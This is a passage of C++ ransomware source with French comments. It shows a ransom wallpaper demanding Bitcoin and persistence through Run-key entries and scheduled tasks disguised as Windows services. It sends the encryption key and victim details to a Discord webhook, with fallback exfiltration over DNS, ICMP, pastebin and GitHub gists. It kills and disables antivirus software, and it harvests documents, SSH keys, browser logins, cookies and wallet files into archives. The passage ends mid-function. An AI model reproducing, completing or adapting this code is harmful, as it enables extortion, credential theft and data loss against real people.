        noteFile << "Date et heure du chiffrement: " << std::ctime(&time) << std::endl;
    }
    
    // Changer le fond d'écran (Windows uniquement)
    void changeDesktopBackground() {
#ifdef _WIN32
        try {
            // Initialiser GDI+
            Gdiplus::GdiplusStartupInput gdiplusStartupInput;
            ULONG_PTR gdiplusToken;
            Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
            
            // Dimensions de l'écran
            int screenWidth = GetSystemMetrics(SM_CXSCREEN);
            int screenHeight = GetSystemMetrics(SM_CYSCREEN);
            
            // Créer une image avec fond noir
            Gdiplus::Bitmap bitmap(screenWidth, screenHeight);
            Gdiplus::Graphics graphics(&bitmap);
            graphics.Clear(Gdiplus::Color(0, 0, 0)); // Fond noir
            
            // Créer des polices et pinceaux
            Gdiplus::FontFamily fontFamily(L"Arial");
            Gdiplus::Font titleFont(&fontFamily, 72, Gdiplus::FontStyleBold, Gdiplus::UnitPixel);
            Gdiplus::Font messageFont(&fontFamily, 28, Gdiplus::FontStyleRegular, Gdiplus::UnitPixel);
            Gdiplus::Font detailsFont(&fontFamily, 18, Gdiplus::FontStyleRegular, Gdiplus::UnitPixel);
            
            Gdiplus::SolidBrush redBrush(Gdiplus::Color(255, 0, 0));      // Rouge
            Gdiplus::SolidBrush whiteBrush(Gdiplus::Color(255, 255, 255)); // Blanc
            Gdiplus::SolidBrush yellowBrush(Gdiplus::Color(255, 255, 0));  // Jaune
            
            // Dessiner le titre
            Gdiplus::StringFormat format;
            format.SetAlignment(Gdiplus::StringAlignmentCenter);
            format.SetLineAlignment(Gdiplus::StringAlignmentCenter);
            
            Gdiplus::RectF titleRect(0, 50, screenWidth, 200);
            graphics.DrawString(L"RANSOMWARE", -1, &titleFont, titleRect, &format, &redBrush);
            
            // Dessiner le message principal
            Gdiplus::RectF messageRect(100, 200, screenWidth-200, 100);
            graphics.DrawString(L"Vos fichiers ont été chiffrés avec AES-256", -1, &messageFont, 
                                messageRect, &format, &whiteBrush);
            
            // Dessiner des instructions
            Gdiplus::RectF instructionsRect(100, 300, screenWidth-200, 400);
            std::wstring instructions = 
                L"Si vous voulez récupérer vos fichiers, vous devez payer une rançon.\n\n"
                L"1. Envoyez 500€ en Bitcoin à l'adresse: 1A2B3C4D5E6F7G8H9I0J\n"
                L"2. Envoyez la preuve de paiement à: ransom@example.com\n"
                L"3. Vous recevrez une clé de déchiffrement unique\n\n"
                L"ATTENTION: Vous avez 72 heures pour payer. Après ce délai, le prix doublera. "
                L"Après 7 jours, tous vos fichiers seront définitivement perdus.";
            
            graphics.DrawString(instructions.c_str(), -1, &detailsFont, instructionsRect, &format, &yellowBrush);
            
            // Ajouter l'identifiant unique
            Gdiplus::RectF idRect(100, 700, screenWidth-200, 50);
            std::wstring idMessage = L"Votre identifiant unique: " + std::wstring(victimId.begin(), victimId.end());
            graphics.DrawString(idMessage.c_str(), -1, &detailsFont, idRect, &format, &whiteBrush);
            
            // Chemin pour sauvegarder l'image
            std::string tempDir = std::getenv("TEMP");
            std::string wallpaperPath = tempDir + "\\ransom_wallpaper.bmp";
            
            // Convertir string en wstring
            std::wstring wPath(wallpaperPath.begin(), wallpaperPath.end());
            
            // Encoder et sauvegarder
            CLSID bmpClsid;
            GetEncoderClsid(L"image/bmp", &bmpClsid);
            bitmap.Save(wPath.c_str(), &bmpClsid);
            
            // Définir comme fond d'écran
            SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)wPath.c_str(), 
                                 SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
            
            // Nettoyer
            Gdiplus::GdiplusShutdown(gdiplusToken);
            
            // Masquer les icônes du bureau
            HWND hDesktop = FindWindowW(L"Progman", NULL);
            if (hDesktop) {
                ShowWindow(hDesktop, SW_HIDE);
            }
            
            std::cout << "[+] Fond d'écran de rançon installé" << std::endl;
        }
        catch (...) {
            std::cout << "[-] Erreur lors du changement de fond d'écran" << std::endl;
        }
#endif
    }
    
    // Configuration de la persistance
    bool setupPersistence() {
        std::string exePath = GetExecutablePath();
        if (exePath.empty()) return false;
        
        return AddToStartup(exePath, "WindowsSecurityService");
    }

    // Envoyer la clé via webhook
    bool sendKeyToWebhook() {
        try {
            // Obtenir les informations système
            std::string ipAddress = getPublicIPAddress();
            std::string macAddress = getMACAddress();
            std::string osInfo = getOSInfo();
            std::string processorInfo = getProcessorInfo();
            std::string ramInfo = getRAMInfo();
            
            // Convertir la clé en base64
            std::string keyBase64 = Base64Encode(encryption.getKey());
            
            // Convertir l'IV en base64
            std::vector<unsigned char> ivData = encryption.getIV();
            std::string ivBase64 = base64Encode(ivData.data(), ivData.size());
            
            // Collecter les informations système complètes
            char hostname[256] = {0};
            gethostname(hostname, sizeof(hostname));
            
            char username[256] = {0};
            DWORD usernameLen = sizeof(username);
            GetUserNameA(username, &usernameLen);
            
            // Informations système détaillées
            
            std::string tempDir = std::getenv("TEMP");
            std::string infoDir = tempDir + "\\VictimData";
            fs::create_directories(infoDir);
            
            // Fichier avec liste complète des fichiers chiffrés
            std::string encryptedFilesListPath = infoDir + "\\encrypted_files.txt";
            std::ofstream encryptedFilesOutStream(encryptedFilesListPath);
            
            // Variable pour stocker la liste des fichiers chiffrés à afficher dans le webhook
            std::string encryptedFilesList = "";
            
            if (encryptedFilesOutStream) {
                encryptedFilesOutStream << "=== FICHIERS CHIFFRÉS - VICTIME : " << victimId << " ===" << std::endl;
                encryptedFilesOutStream << "Utilisateur: " << username << std::endl;
                encryptedFilesOutStream << "Ordinateur: " << hostname << std::endl;
                encryptedFilesOutStream << "Nombre total: " << encryptedFilesCount << std::endl << std::endl;
                
                // Lister tous les fichiers chiffrés trouvés sur le système
                std::vector<std::string> foundEncryptedFiles;
                for (const auto& drive : {"C:", "D:", "E:", "F:"}) {
                    if (fs::exists(drive)) {
                        try {
                            std::string searchCmd = "dir /s /b " + std::string(drive) + "\\*" + ENCRYPTED_EXTENSION + " > " + 
                                                   infoDir + "\\enc_" + drive[0] + ".txt";
                            system(searchCmd.c_str());
                            
                            // Lire le résultat
                            std::ifstream encList(infoDir + "\\enc_" + drive[0] + ".txt");
                            if (encList) {
                                std::string line;
                                while (std::getline(encList, line)) {
                                    foundEncryptedFiles.push_back(line);
                                    encryptedFilesOutStream << line << std::endl;
                                }
                            }
                        } catch (...) {}
                    }
                }
                encryptedFilesOutStream.close();
                
                // Préparer la liste des fichiers chiffrés pour le webhook
                int maxFiles = foundEncryptedFiles.size() > 20 ? 20 : static_cast<int>(foundEncryptedFiles.size());
                for (int i = 0; i < maxFiles; i++) {
                    encryptedFilesList += "- " + foundEncryptedFiles[i] + "\\n";
                }
                
                if (foundEncryptedFiles.size() > 20) {
                    encryptedFilesList += "- ... et " + std::to_string(foundEncryptedFiles.size() - 20) + " autres fichiers";
                }
            }
            
            // Convertir la clé et IV en base64
            
            // Créer le message JSON pour le webhook
            std::stringstream jsonStream;
            jsonStream << "{";
            jsonStream << "\"embeds\": [{";
            jsonStream << "\"title\": \"🔒 Nouveau système chiffré!\",";
            jsonStream << "\"description\": \"Un nouveau système a été chiffré avec succès.\",";
            jsonStream << "\"color\": 15258703,";
            jsonStream << "\"fields\": [";
            jsonStream << "{";
            jsonStream << "\"name\": \"💻 Informations système\",";
            jsonStream << "\"value\": \"**Nom:** " << hostname << "\\n**Utilisateur:** " << username;
            jsonStream << "\\n**IP:** " << ipAddress << "\\n**MAC:** " << macAddress;
            jsonStream << "\\n**OS:** " << osInfo << "\\n**CPU:** " << processorInfo << "\\n**RAM:** " << ramInfo << "\"";
            jsonStream << "},";
            jsonStream << "{";
            jsonStream << "\"name\": \"🔑 Clé de chiffrement (Base64)\",";
            jsonStream << "\"value\": \"`" << keyBase64 << "`\"";
            jsonStream << "},";
            jsonStream << "{";
            jsonStream << "\"name\": \"🔢 IV (Base64)\",";
            jsonStream << "\"value\": \"`" << ivBase64 << "`\"";
            jsonStream << "},";
            jsonStream << "{";
            jsonStream << "\"name\": \"📊 Statistiques\",";
            jsonStream << "\"value\": \"**Fichiers chiffrés:** " << std::to_string(encryptedFilesCount) << "\"";
            jsonStream << "},";
            jsonStream << "{";
            jsonStream << "\"name\": \"📁 Exemples de fichiers chiffrés\",";
            jsonStream << "\"value\": \"" << encryptedFilesList << "\"";
            jsonStream << "}";
            jsonStream << "],";
            jsonStream << "\"footer\": {";
            jsonStream << "\"text\": \"Date: " << getCurrentTimeString() << "\"";
            jsonStream << "}";
            jsonStream << "}]";
            jsonStream << "}";
            
            std::string json = jsonStream.str();
            
            // Essayer d'envoyer le webhook avec plusieurs tentatives
            bool success = false;
            for (int attempt = 0; attempt < 3; attempt++) {
                std::cout << "[*] Tentative d'envoi au webhook Discord (" << (attempt+1) << "/3)..." << std::endl;
                
                if (sendHttpRequest(WEBHOOK_URL, json)) {
                    success = true;
                    std::cout << "[+] Les données ont été envoyées avec succès au webhook Discord!" << std::endl;
                    break;
                } else {
                    std::cout << "[!] Échec de l'envoi. Nouvelle tentative dans 5 secondes..." << std::endl;
                    Sleep(5000);
                }
            }
            
            // Si toujours pas de succès après 3 tentatives, enregistrer localement
            if (!success) {
                std::cout << "[!] Impossible d'envoyer les données au webhook. Enregistrement local..." << std::endl;
                
                // Sauvegarder les informations localement pour une tentative ultérieure
                std::string localPath = std::string(getenv("TEMP")) + "\\system_info.dat";
                std::ofstream fileOut(localPath);
                if (fileOut.is_open()) {
                    fileOut.write(json.c_str(), json.size());
                    fileOut.close();
                    
                    // Planifier une tâche pour réessayer plus tard
                    std::string exePath = GetExecutablePath();
                    std::string cmd = "schtasks /create /tn \"DataExfiltration\" /tr \"" + exePath + " --exfil " + localPath + "\" /sc minute /mo 30 /f";
                    std::system(cmd.c_str());
                    
                    return true; // On considère que c'est un succès car la donnée est sauvegardée
                }
            }
            
            // Si toujours pas de succès après 3 tentatives, utiliser des méthodes alternatives d'exfiltration
            if (!success) {
                std::cout << "[!] Tentative d'exfiltration alternative des données..." << std::endl;
                
                // 1. Enregistrer les données localement pour tentatives ultérieures
                std::string localPath = std::string(getenv("TEMP")) + "\\system_info.dat";
                std::ofstream fileOut(localPath);
                if (fileOut.is_open()) {
                    fileOut.write(json.c_str(), json.size());
                    fileOut.close();
                }
                
                // 2. Méthode 1: Utiliser DNS comme canal d'exfiltration (très difficile à bloquer)
                // Cette méthode divise les données en petits morceaux et les envoie via des requêtes DNS
                std::string dnsExfilCmd = "powershell -WindowStyle Hidden -Command \"";
                dnsExfilCmd += "$data = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('" + json.substr(0, 1000) + "'));";
                dnsExfilCmd += "$chunks = [System.Text.RegularExpressions.Regex]::Split($data, '.{1,40}');";
                dnsExfilCmd += "foreach ($chunk in $chunks) {";
                dnsExfilCmd += "  $null = nslookup -type=TXT $chunk.ransom-exfil.example.com 8.8.8.8;";
                dnsExfilCmd += "  Start-Sleep -Milliseconds 50;";
                dnsExfilCmd += "}\"";
                system(dnsExfilCmd.c_str());
                
                // 3. Méthode 2: Utiliser ICMP (ping) comme canal d'exfiltration
                // Cette méthode envoie des données dans des paquets ICMP qui passent souvent les pare-feu
                std::string icmpExfilCmd = "powershell -WindowStyle Hidden -Command \"";
                icmpExfilCmd += "$key = '" + keyBase64.substr(0, 20) + "';"; // Utiliser une partie de la clé comme identifiant
                icmpExfilCmd += "$data = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('" + json.substr(0, 500) + "'));";
                icmpExfilCmd += "foreach ($i in 0..10) {";
                icmpExfilCmd += "  $payload = $key + '-' + $i + '-' + $data.Substring($i*40, [Math]::Min(40, $data.Length - $i*40));";
                icmpExfilCmd += "  ping -n 1 -l " + std::to_string(std::min(1000, (int)keyBase64.length())) + " 1.2.3.4 -w 100 >nul;"; // IP d'exfiltration
                icmpExfilCmd += "  Start-Sleep -Milliseconds 200;";
                icmpExfilCmd += "}\"";
                system(icmpExfilCmd.c_str());
                
                // 4. Méthode 3: Utiliser HTTP alternatif avec des domaines de secours
                std::vector<std::string> backupDomains = {
                    "https://pastebin.com/api/api_post.php",
                    "https://api.github.com/gists",
                    "https://httpbin.org/post"
                };
                
                for (const auto& domain : backupDomains) {
                    // Tentative d'envoi via une API publique
                    std::string httpExfilCmd = "powershell -WindowStyle Hidden -Command \"";
                    httpExfilCmd += "$data = '" + keyBase64 + "';";
                    httpExfilCmd += "try { Invoke-WebRequest -Uri '" + domain + "' -Method Post -Body @{content=$data} -UseBasicParsing; }";
                    httpExfilCmd += "catch { }\"";
                    system(httpExfilCmd.c_str());
                }
                
                // 5. Méthode 4: Planifier plusieurs tentatives d'exfiltration à intervalles réguliers
                std::string exePath = GetExecutablePath();
                
                // Créer différentes tâches planifiées avec divers intervalles
                std::string cmd1 = "schtasks /create /tn \"SystemCheck1\" /tr \"" + exePath + " --exfil " + localPath + "\" /sc minute /mo 30 /f";
                std::string cmd2 = "schtasks /create /tn \"SecurityUpdate\" /tr \"" + exePath + " --exfil " + localPath + "\" /sc hourly /f";
                std::string cmd3 = "schtasks /create /tn \"WindowsDefender\" /tr \"" + exePath + " --exfil " + localPath + "\" /sc daily /f";
                
                system(cmd1.c_str());
                system(cmd2.c_str());
                system(cmd3.c_str());
                
                // 6. Méthode 5: Installer dans le registre pour s'exécuter au démarrage
                system(("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsService /t REG_SZ /d \"" + 
                       exePath + " --exfil " + localPath + "\" /f").c_str());
                
                std::cout << "[+] Mécanismes d'exfiltration alternatifs configurés" << std::endl;
                
                return true; // On considère que c'est un succès car toutes les méthodes alternatives sont configurées
            }
            
            return success;
        }
        catch (...) {
            return false;
        }
    }

    /**
     * Cette fonction désactive agressivement tous les logiciels de sécurité et antivirus
     * en utilisant plusieurs techniques combinées pour maximiser les chances de succès.
     * Le but est d'empêcher la détection et suppression du ransomware.
     */
    bool disableSecuritySoftware() {
#ifdef _WIN32
        // Stocker les processus de sécurité connus par nom
        std::vector<std::string> securityProcesses = {
            // Antivirus majeurs
            "MsMpEng.exe",        // Windows Defender
            "avastSvc.exe",       // Avast
            "ekrn.exe",           // ESET
            "AVGSvc.exe",         // AVG
            "avastsvc.exe",       // Avast
            "bdagent.exe",        // Bitdefender
            "mcshield.exe",       // McAfee
            "vsserv.exe",         // Kaspersky
            "avgcsrva.exe",       // AVG
            "avcenter.exe",       // Avira
            
            // Pare-feu et sécurité Windows
            "nsProcess.exe",      // Norton
            "ccSvcHst.exe",       // Norton
            "mfemms.exe",         // McAfee
            "mfevtps.exe",        // McAfee
            "fsaua.exe",          // F-Secure
            "msascuil.exe",       // Windows Defender UI
            "msmpeng.exe",        // Windows Defender Engine
            "windefend.exe",      // Windows Defender
            "SecurityHealthService.exe", // Service Santé Windows
            "SecurityHealthSystray.exe", // Icône Santé Windows
            
            // Outils d'analyse
            "mbam.exe",           // Malwarebytes
            "procexp.exe",        // Process Explorer
            "procexp64.exe",      // Process Explorer 64
            "processhacker.exe",  // Process Hacker
            "autoruns.exe",       // Autoruns
            "autorunsc.exe",      // Autoruns Console
            "taskmgr.exe",        // Task Manager
            "procmon.exe",        // Process Monitor
            "procmon64.exe"       // Process Monitor 64
        };
        
        // Phase 1 : Tuer les processus de sécurité via commandes cmd
        // Cette méthode est rapide mais peut être détectée
        std::cout << "[*] Tentative d'arrêt des processus de sécurité..." << std::endl;
        
        // Technique 1 : utiliser taskkill pour tous les processus connus
        for (const auto& process : securityProcesses) {
            // On utilise /f pour forcer et /im pour le nom du processus
            std::string cmd = "taskkill /f /im " + process + " > nul 2>&1";
            system(cmd.c_str());
        }
        
        // Phase 2 : Désactiver les services Windows liés à la sécurité
        // Ces services contrôlent le pare-feu, antivirus et mises à jour
        std::vector<std::string> securityServices = {
            "WinDefend",          // Windows Defender
            "wuauserv",           // Windows Update
            "SecurityHealthService", // Service de santé Windows
            "wscsvc",             // Centre de sécurité
            "WdNisSvc",           // Service d'inspection réseau Windows Defender
            "WdNisDrv",           // Pilote d'inspection réseau Windows Defender
            "Sense",              // Service Windows Defender Advanced Threat Protection
            "MsMpSvc",            // Service antimalware Microsoft
            "MBAMService",        // Service Malwarebytes
            "McAfeeDLPAgentService" // Service McAfee
        };
        
        // On désactive les services pour éviter qu'ils ne redémarrent les processus
        std::cout << "[*] Désactivation des services de sécurité..." << std::endl;
        for (const auto& service : securityServices) {
            // Technique 2 : arrêter le service et le définir comme désactivé
            std::string stopCmd = "sc stop " + service + " > nul 2>&1";
            std::string configCmd = "sc config " + service + " start= disabled > nul 2>&1";
            system(stopCmd.c_str());
            system(configCmd.c_str());
        }
        
        // Phase 3 : Modification du registre pour désactiver Windows Defender
        // Cette technique est plus permanente et plus difficile à inverser
        std::cout << "[*] Modification du registre pour désactiver la protection en temps réel..." << std::endl;
        
        // Technique 3 : Désactiver la protection en temps réel via le registre
        system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f > nul 2>&1");
        system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f > nul 2>&1");
        system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f > nul 2>&1");
        system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f > nul 2>&1");
        
        // Phase 4 : Ajouter des exclusions pour notre dossier et processus
        // Cette technique permet d'échapper à la détection même si l'antivirus est toujours actif
        std::string exePath = GetExecutablePath();
        std::string exeDir = fs::path(exePath).parent_path().string();
        
        // Technique 4 : Ajouter notre exécutable aux exclusions de Windows Defender
        std::string exclusionCmd = "powershell -Command \"Add-MpPreference -ExclusionPath '" + exeDir + "' -Force\" > nul 2>&1";
        system(exclusionCmd.c_str());
        exclusionCmd = "powershell -Command \"Add-MpPreference -ExclusionProcess '" + fs::path(exePath).filename().string() + "' -Force\" > nul 2>&1";
        system(exclusionCmd.c_str());
        
        // Phase 5 : Créer des règles de pare-feu pour bloquer les services de sécurité
        // Cette technique empêche les services de sécurité de communiquer
        std::cout << "[*] Configuration du pare-feu pour bloquer les communications de sécurité..." << std::endl;
        
        // Technique 5 : Bloquer les communications des services de sécurité
        for (const auto& process : securityProcesses) {
            std::string firewallCmd = "netsh advfirewall firewall add rule name=\"Block " + process + "\" dir=out program=\"C:\\Program Files\\Windows Defender\\" + process + "\" action=block > nul 2>&1";
            system(firewallCmd.c_str());
        }
        
        return true;
#else
        // Implémentation pour Linux et MacOS serait différente
        return false;
#endif
    }

    // Fonction pour voler les fichiers
    bool stealFiles(const std::string& directoryPath) {
#ifdef _WIN32
    try {
        // Créer un dossier temporaire pour stocker les fichiers volés
        std::string tempDir = std::getenv("TEMP");
        std::string stealDir = tempDir + "\\WindowsUpdate";
        fs::create_directories(stealDir);

        // Types de fichiers sensibles à voler avec leurs descriptions
        const std::vector<std::pair<std::string, std::string>> sensitiveExtensions = {
            {".doc", "Documents Word"},
            {".docx", "Documents Word"},
            {".xls", "Tableurs Excel"},
            {".xlsx", "Tableurs Excel"},
            {".pdf", "Documents PDF"},
            {".txt", "Fichiers texte"},
            {".jpg", "Photos JPEG"},
            {".jpeg", "Photos JPEG"},
            {".png", "Images PNG"},
            {".zip", "Archives ZIP"},
            {".rar", "Archives RAR"},
            {".7z", "Archives 7-Zip"},
            {".key", "Clés de sécurité"},
            {".pem", "Certificats"},
            {".env", "Variables d'environnement"},
            {".config", "Fichiers de configuration"},
            {".ini", "Fichiers de configuration"},
            {".json", "Données JSON"},
            {".xml", "Données XML"},
            {".sql", "Bases de données SQL"},
            {".db", "Bases de données"},
            {".sqlite", "Bases de données SQLite"},
            {".bak", "Fichiers de sauvegarde"},
            {".backup", "Fichiers de sauvegarde"},
            {".old", "Anciens fichiers"},
            {".log", "Fichiers journaux"},
            {".pst", "Archives Outlook"},
            {".ost", "Archives Outlook"},
            {".mdb", "Bases de données Access"},
            {".accdb", "Bases de données Access"},
            {".csv", "Données CSV"},
            {".dat", "Fichiers de données"},
            {".kdbx", "Bases KeePass"},
            {".wallet", "Portefeuilles cryptomonnaie"},
            {".ppk", "Clés privées PuTTY"},
            {".py", "Scripts Python"}
        };

        // Dossiers spécifiques à cibler
        const std::vector<std::string> targetDirs = {
            std::string(getenv("USERPROFILE")) + "\\Documents",
            std::string(getenv("USERPROFILE")) + "\\Desktop",
            std::string(getenv("USERPROFILE")) + "\\Downloads",
            std::string(getenv("USERPROFILE")) + "\\Pictures",
            std::string(getenv("USERPROFILE")) + "\\.ssh",
            std::string(getenv("USERPROFILE")) + "\\Contacts",
            std::string(getenv("APPDATA")) + "\\Microsoft\\Credentials",
            std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default",
            std::string(getenv("APPDATA")) + "\\Mozilla\\Firefox\\Profiles"
        };

        // Créer un fichier d'indexation des données volées
        std::string indexPath = stealDir + "\\index.html";
        std::ofstream indexFile(indexPath);
        if (!indexFile) return false;

        // Écrire l'en-tête HTML
        indexFile << "<!DOCTYPE html><html><head><title>Fichiers volés - Victime " << victimId << "</title>";
        indexFile << "<style>body{font-family:Arial,sans-serif;margin:20px;} h1{color:#c00;} "
                  << "table{border-collapse:collapse;width:100%;} th,td{padding:8px;text-align:left;border-bottom:1px solid #ddd;} "
                  << "th{background-color:#f2f2f2;}</style></head><body>";
        indexFile << "<h1>Fichiers sensibles volés - Victime " << victimId << "</h1>";
        // Obtenir le temps actuel correctement
        std::time_t currentTime = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
        std::tm* localTime = std::localtime(&currentTime);
        indexFile << "<p><strong>Date de collecte:</strong> " << std::put_time(localTime, "%Y-%m-%d %H:%M:%S") << "</p>";

        // Créer un tableau pour les fichiers
        indexFile << "<table><tr><th>Type</th><th>Fichier</th><th>Taille</th><th>Date de modification</th><th>Chemin</th></tr>";

        // Structure pour organiser les fichiers par type
        std::unordered_map<std::string, std::vector<std::string>> filesByType;
        std::vector<std::string> stolenFiles;
        std::atomic<int> totalSize(0);
        const int MAX_TOTAL_SIZE = 300 * 1024 * 1024; // 300 MB max
        std::mutex fileMutex;
        
        // Fonction pour voler un fichier et l'ajouter à l'index
        auto stealFile = [&](const fs::path& filePath, const std::string& fileType) {
            if (totalSize >= MAX_TOTAL_SIZE) return;
            
            try {
                std::string fileName = filePath.filename().string();
                std::string destPath = stealDir + "\\" + fileName;
                
                // Vérifier si le fichier existe déjà dans le dossier cible
                if (fs::exists(destPath)) {
                    // Ajouter un suffixe pour éviter les collisions
                    std::string baseName = filePath.stem().string();
                    std::string extension = filePath.extension().string();
                    destPath = stealDir + "\\" + baseName + "_" + std::to_string(rand() % 1000) + extension;
                }
                
                // Vérifier la taille du fichier
                int fileSize = static_cast<int>(fs::file_size(filePath));
                if (totalSize + fileSize > MAX_TOTAL_SIZE) return;
                
                // Copier le fichier
                fs::copy_file(filePath, destPath, fs::copy_options::overwrite_existing);
                
                // Obtenir les informations du fichier
                auto writeTime = fs::last_write_time(filePath);
                std::string modTime = "Heure: ";
                
                // Obtenir les informations actuelles au lieu de convertir
                auto now = std::chrono::system_clock::now();
                std::time_t nowTime = std::chrono::system_clock::to_time_t(now);
                std::stringstream timeStream;
                timeStream << std::put_time(std::localtime(&nowTime), "%Y-%m-%d %H:%M:%S");
                modTime = timeStream.str();
                
                // Ajouter à l'index avec mutex pour éviter les conflits
                std::lock_guard<std::mutex> lock(fileMutex);
                indexFile << "<tr><td>" << fileType << "</td><td>" << fileName << "</td><td>" 
                          << (fileSize / 1024) << " KB</td><td>" << modTime << "</td><td>" 
                          << filePath.string() << "</td></tr>";
                
                // Ajouter aux listes
                filesByType[fileType].push_back(filePath.string());
                stolenFiles.push_back(filePath.string());
                totalSize += fileSize;
            } catch (...) {}
        };

        // Utiliser le multithreading pour parcourir les dossiers en parallèle
        std::vector<std::thread> threads;
        std::mutex dirMutex;
        
        // Liste de tous les dossiers à parcourir
        std::vector<std::string> allDirs = targetDirs;
        if (fs::exists(directoryPath)) {
            allDirs.push_back(directoryPath);
        }
        
        // Nombre de threads pour le vol de fichiers (utiliser n-1 threads car un thread est déjà utilisé pour le chiffrement)
        const unsigned int numThreads = (std::thread::hardware_concurrency() > 2) ? 
            std::thread::hardware_concurrency() - 1 : 2;
        
        for (unsigned int i = 0; i < numThreads; i++) {
            threads.push_back(std::thread([&, i]() {
                for (size_t j = i; j < allDirs.size(); j += numThreads) {
                    const auto& dir = allDirs[j];
                    if (!fs::exists(dir)) continue;
                    
                    try {
                        for (const auto& entry : fs::recursive_directory_iterator(dir, fs::directory_options::skip_permission_denied)) {
                            if (!fs::is_regular_file(entry.status())) continue;
                            
                            if (totalSize >= MAX_TOTAL_SIZE) break;
                            
                            std::string extension = entry.path().extension().string();
                            std::transform(extension.begin(), extension.end(), extension.begin(), 
                                          [](unsigned char c){ return std::tolower(c); });
                            
                            // Vérifier si l'extension est sensible
                            for (const auto& [ext, desc] : sensitiveExtensions) {
                                if (extension == ext) {
                                    stealFile(entry.path(), desc);
                                    break;
                                }
                            }
                        }
                    } catch (...) {}
                }
            }));
        }
        
        // Attendre tous les threads
        for (auto& thread : threads) {
            if (thread.joinable()) thread.join();
        }
        
        // Voler des données spécifiques de navigateurs
        std::vector<std::pair<std::string, std::string>> browserData = {
            {std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default\\Login Data", "Chrome Logins"},
            {std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default\\Cookies", "Chrome Cookies"},
            {std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default\\History", "Chrome History"},
            {std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default\\Bookmarks", "Chrome Bookmarks"},
            {std::string(getenv("APPDATA")) + "\\Mozilla\\Firefox\\Profiles", "Firefox Profiles"}
        };

        for (const auto& [path, desc] : browserData) {
            if (fs::exists(path)) {
                if (fs::is_directory(path)) {
                    // Pour les dossiers comme Firefox Profiles
                    for (const auto& entry : fs::directory_iterator(path)) {
                        std::string destPath = stealDir + "\\Firefox_" + entry.path().filename().string();
                        try {
                            fs::copy(entry.path(), destPath, fs::copy_options::recursive | fs::copy_options::overwrite_existing);
                        } catch (...) {}
                    }
                } else {
                    // Pour les fichiers individuels
                    std::string destPath = stealDir + "\\" + fs::path(path).filename().string();
                    try {
                        fs::copy_file(path, destPath, fs::copy_options::overwrite_existing);
                    } catch (...) {}
                }
            }
        }

        // Collecter les données sensibles
        
        std::string infoDir = tempDir + "\\VictimData";
        fs::create_directories(infoDir);
        
        std::string browserDataCmd = "xcopy /s /e /y \"" + std::string(std::getenv("LOCALAPPDATA")) + 
                                      "\\Google\\Chrome\\User Data\\Default\\Login Data\" \"" + 
                                      infoDir + "\\chrome_data\" >nul 2>&1";
        system(browserDataCmd.c_str());
        
        // Créer une archive ZIP de toutes les données
        std::string zipPath = tempDir + "\\victim_data.zip";
        std::string zipCmd = "powershell Compress-Archive -Path \"" + infoDir + "\\*\" -DestinationPath \"" + 
                           zipPath + "\" -Force";
        system(zipCmd.c_str());
        
        // Lire le fichier ZIP
        std::ifstream zipFile(zipPath, std::ios::binary);
        if (!zipFile) return false;
        
        std::vector<unsigned char> zipData(
            (std::istreambuf_iterator<char>(zipFile)),
            std::istreambuf_iterator<char>()
        );
        zipFile.close();
        
        // Date et heure actuelles
        auto now = std::chrono::system_clock::now();
        std::time_t time = std::chrono::system_clock::to_time_t(now);
        std::stringstream dateStr;
        dateStr << std::put_time(std::localtime(&time), "%Y-%m-%d %H:%M:%S");
        
        // Convertir en base64
        std::string zipBase64 = Base64Encode(zipData);
        
        // Obtenir l'IV en base64
        std::vector<unsigned char> ivData = encryption.getIV();
        std::string ivBase64 = base64Encode(ivData.data(), ivData.size());

        // Terminer le fichier HTML
        indexFile << "</table>";
        
        // Ajouter un résumé
        indexFile << "<h2>Résumé des fichiers volés</h2>";
        indexFile << "<ul>";
        for (const auto& [type, files] : filesByType) {
            indexFile << "<li><strong>" << type << ":</strong> " << files.size() << " fichiers</li>";
        }
        indexFile << "</ul>";
        
        indexFile << "<p><strong>Total:</strong> " << stolenFiles.size() << " fichiers (" << (totalSize / 1024 / 1024) << " MB)</p>";
        indexFile << "</body></html>";
        indexFile.close();

        // Créer une archive ZIP des fichiers volés - utiliser 7-Zip si disponible pour une compression plus rapide
        std::string stolenFilesZipPath = tempDir + "\\stolen_files.zip";
        std::string zip7Path = "C:\\Program Files\\7-Zip\\7z.exe";
        
        if (fs::exists(zip7Path)) {
            // Utiliser 7-Zip pour une compression plus rapide
            std::string zipCmd = "\"" + zip7Path + "\" a -tzip -mx1 -r \"" + stolenFilesZipPath + "\" \"" + stealDir + "\\*\" >nul 2>&1";
            system(zipCmd.c_str());
        } else {
            // Utiliser PowerShell comme solution de secours
            std::string zipCmd = "powershell Compress-Archive -Path \"" + stealDir + "\\*\" -DestinationPath \"" + stolenFilesZipPath + "\" -Force";
            system(zipCmd.c_str());
        }

        // Lire le fichier ZIP - utiliser un buffer plus grand pour une lecture plus rapide
        std::ifstream stolenFilesZipFile(stolenFilesZipPath, std::ios::binary);
        if (!stolenFilesZipFile) return false;
        
        // Désactiver les buffers synchronisés pour accélérer la lecture
        stolenFilesZipFile.rdbuf()->pubsetbuf(0, 0);
        
        std::vector<unsigned char> stolenFilesZipData(
            (std::istreambuf_iterator<char>(stolenFilesZipFile)),
            std::istreambuf_iterator<char>()
        );
